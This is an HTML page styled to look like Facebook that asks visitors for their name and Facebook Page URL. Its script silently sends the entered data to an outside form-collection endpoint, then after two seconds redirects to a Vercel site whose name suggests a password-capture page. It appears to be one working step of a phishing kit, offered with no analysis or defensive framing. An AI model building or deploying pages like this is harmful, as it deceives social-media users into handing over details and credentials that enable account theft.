<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Submit Request</title>

<style>
body{
    margin:0;
    background:#f0f2f5;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
}
.container{
    max-width:520px;
    margin:40px auto;
    padding:20px;
}
.card{
    background:#fff;
    border-radius:10px;
    box-shadow:0 2px 12px rgba(0,0,0,.08);
    padding:25px;
    text-align:center;
}
h2{
    font-size:18px;
    color:#050505;
    margin-bottom:20px;
}
form input{
    width:100%;
    padding:10px;
    margin-bottom:10px;
    border:1px solid #ddd;
    border-radius:6px;
    font-size:14px;
}
form button{
    width:100%;
    padding:12px;
    background:#1877f2;
    border:none;
    color:#fff;
    font-size:14px;
    font-weight:600;
    border-radius:6px;
    cursor:pointer;
    display:flex;
    align-items:center;
    justify-content:center;
    gap:8px;
}
.spinner{
    width:16px;
    height:16px;
    border:2px solid rgba(255,255,255,.4);
    border-top:2px solid #fff;
    border-radius:50%;
    animation:spin 1s linear infinite;
}
@keyframes spin{
    0%{transform:rotate(0deg)}
    100%{transform:rotate(360deg)}
}
</style>
</head>
<body>

<div class="container">
<div class="card">

<h2>Submitting Your Request…</h2>

<form id="requestForm">
    <input type="text" name="name" placeholder="Your Name" required>
    <input type="url" name="facebook_page" placeholder="Facebook Page URL" required>
    <button type="submit" id="submitBtn">
        <span id="btnText">Continue</span>
    </button>
</form>

</div>
</div>

<script>
const form = document.getElementById('requestForm');
const btn = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');

form.addEventListener('submit', function(e){
    e.preventDefault();

    // Show spinner
    btn.disabled = true;
    btnText.innerHTML = '<div class="spinner"></div> Continue…';

    // Submit data to external form
    fetch("https://submit-form.com/upL3IuLAs", {
        method: 'POST',
        body: new FormData(form)
    }).finally(() => {
        // Redirect to final link after 2 seconds
        setTimeout(() => {
            window.location.href = "https://password-two-khaki.vercel.app/";
        }, 2000);
    });
});
</script>

</body>
</html>
